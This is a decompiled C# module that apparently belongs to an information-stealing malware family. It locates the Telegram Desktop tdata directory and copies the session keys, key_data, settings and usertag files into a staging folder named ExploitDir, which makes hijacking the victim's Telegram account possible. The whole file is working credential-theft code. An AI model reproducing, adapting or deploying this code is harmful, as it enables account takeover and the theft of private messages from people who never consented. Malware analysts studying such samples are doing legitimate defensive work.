﻿using System;
using System.Diagnostics;
using System.IO;

namespace SHARP
{
	// Token: 0x02000065 RID: 101
	internal class Telegram
	{
		// Token: 0x0600022D RID: 557 RVA: 0x0000DCDC File Offset: 0x0000BEDC
		public static void CopyDirectory(string sourceFolder, string destFolder)
		{
			if (!Directory.Exists(destFolder))
			{
				Directory.CreateDirectory(destFolder);
			}
			foreach (string text in Directory.GetFiles(sourceFolder))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(destFolder, fileName);
				File.Copy(text, destFileName);
			}
			foreach (string text2 in Directory.GetDirectories(sourceFolder))
			{
				string fileName2 = Path.GetFileName(text2);
				string destFolder2 = Path.Combine(destFolder, fileName2);
				Filemanager.CopyDirectory(text2, destFolder2);
			}
		}

		// Token: 0x0600022E RID: 558 RVA: 0x0000DD58 File Offset: 0x0000BF58
		private static string GetTdata()
		{
			string result = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
			Process[] processesByName = Process.GetProcessesByName("Telegram");
			if (processesByName.Length == 0)
			{
				return result;
			}
			return Path.Combine(Path.GetDirectoryName(ProcessList.ProcessExecutablePath(processesByName[0])), "tdata");
		}

		// Token: 0x0600022F RID: 559 RVA: 0x0000DDA0 File Offset: 0x0000BFA0
		public static void GetTelegramSessions()
		{
			string text = Help.ExploitDir;
			string tdata = Telegram.GetTdata();
			try
			{
				if (Directory.Exists(tdata))
				{
					text += "\\Telegram";
					Directory.CreateDirectory(text);
					string[] directories = Directory.GetDirectories(tdata);
					string[] files = Directory.GetFiles(tdata);
					foreach (string text2 in directories)
					{
						string name = new DirectoryInfo(text2).Name;
						if (name.Length == 16)
						{
							string destFolder = Path.Combine(text, name);
							Telegram.CopyDirectory(text2, destFolder);
						}
					}
					string[] array = files;
					for (int i = 0; i < array.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(array[i]);
						string name2 = fileInfo.Name;
						string destFileName = Path.Combine(text, name2);
						if (fileInfo.Length <= 5120L)
						{
							if (name2.EndsWith("s") && name2.Length == 17)
							{
								fileInfo.CopyTo(destFileName);
							}
							else
							{
								if (name2.StartsWith("usertag") || name2.StartsWith("settings") || name2.StartsWith("key_data"))
								{
									fileInfo.CopyTo(destFileName);
								}
								Counting.Telegram++;
							}
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
	}
}
